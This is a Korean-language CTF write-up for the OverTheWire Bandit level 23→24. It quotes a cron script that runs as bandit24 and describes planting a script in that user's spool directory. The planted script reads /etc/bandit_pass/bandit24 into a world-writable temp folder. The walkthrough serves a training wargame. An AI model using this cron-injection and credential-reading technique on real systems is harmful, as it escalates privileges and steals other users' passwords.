# Overview

`cron`이 실행되고 있으며, `/etc/cron.d/`의 설정들을 확인하고, 어떤 명령이 실행되고 있는지 확인하라

# Analysis

문제에서 제시된 `/etc/cron.d/`의 파일들을 확인한 결과 다음 레벨에 관련된 `cronjob_bandit24`파일을 찾을 수 있으며, `/usr/bin/cronjob_bandit24.sh`을 실행하고 있는 것을 알 수 있음.

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"

# 전체 파일, 숨김파일 반복
for i in * .*;
do
    # . , .. 제외
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        # 파일의 owner user name
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            # i 실행후 60초 뒤 SIGKILL
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

# Exploitation

매 분마다 `bandit24`의 권한으로 `/usr/bin/cronjob_bandit24.sh`을 실행시키기 때문에 `/var/spool/bandit24/foo` 위치에 스크립트를 넣음으로써 `bandit24`의 권한으로 실행시킬 수 있게 된다.

임시폴더를 만들어 `bandit24`가 접근할 수 있도록 권한을 열었으며, `solve.sh` 파일을 만들어 실행권한을 주고 `/var/spool/bandit24/foo`위치로 복사했다.

```bash
mktemp -d # /tmp/tmp.pZjuixvKB9

chmod 777 /tmp/tmp.pZjuixvKB9

chmod +x solve.sh

cp /tmp/tmp.pZjuixvKB9/solve.sh /var/spool/bandit24/foo
```

다음 비밀번호가 저장된 곳인 `/etc/bandit_pass/bandit24`를 읽어 임시폴더로 비밀번호를 출력하게 하였다.

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.pZjuixvKB9/flag
```

크론에 지정된 대로 매 분(0분)이 되었을 때 flag 파일안에 비밀번호가 출력된 것을 알 수 있다.

# Flag

`gb...G8`
